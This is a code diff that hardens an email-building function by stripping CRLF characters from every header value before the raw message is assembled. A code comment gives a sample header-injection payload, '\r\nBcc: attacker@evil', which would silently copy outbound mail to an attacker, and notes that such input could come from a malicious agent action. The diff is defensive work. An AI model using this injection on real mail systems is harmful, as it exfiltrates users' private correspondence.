@@ -1622,17 +1622,29 @@ function buildRawEmail(opts: {
   references?: string;
   tracking?: TrackingContext;
 }): string {
+  // Strip CRLF from every header value before concatenation. Without this an
+  // attacker who controls `to`/`cc`/`bcc`/`subject` (via API or a malicious
+  // agent action) can inject `\r\nBcc: attacker@evil` and exfiltrate the
+  // outbound mail through the victim's connected Gmail account.
+  const safeFrom = stripCrlf(opts.from);
+  const safeTo = stripCrlf(opts.to);
+  const safeCc = stripCrlf(opts.cc);
+  const safeBcc = stripCrlf(opts.bcc);
+  const safeSubject = stripCrlf(opts.subject);
+  const safeInReplyTo = opts.inReplyTo ? stripCrlf(opts.inReplyTo) : "";
+  const safeReferences = opts.references ? stripCrlf(opts.references) : "";
+
   const boundary = `agent-native-${nanoid(12)}`;
   const textBody = markdownToPlainText(opts.body);
   const htmlBody = bodyToHtml(opts.body, opts.tracking);
   const lines = [
-    `From: ${opts.from}`,
-    `To: ${opts.to}`,
-    ...(opts.cc ? [`Cc: ${opts.cc}`] : []),
-    ...(opts.bcc ? [`Bcc: ${opts.bcc}`] : []),
-    `Subject: ${opts.subject}`,
-    ...(opts.inReplyTo ? [`In-Reply-To: ${opts.inReplyTo}`] : []),
-    ...(opts.references ? [`References: ${opts.references}`] : []),
+    `From: ${safeFrom}`,
+    `To: ${safeTo}`,
+    ...(safeCc ? [`Cc: ${safeCc}`] : []),
+    ...(safeBcc ? [`Bcc: ${safeBcc}`] : []),
+    `Subject: ${safeSubject}`,
+    ...(safeInReplyTo ? [`In-Reply-To: ${safeInReplyTo}`] : []),
+    ...(safeReferences ? [`References: ${safeReferences}`] : []),
     `MIME-Version: 1.0`,
     `Content-Type: multipart/alternative; boundary="${boundary}"`,
     "",
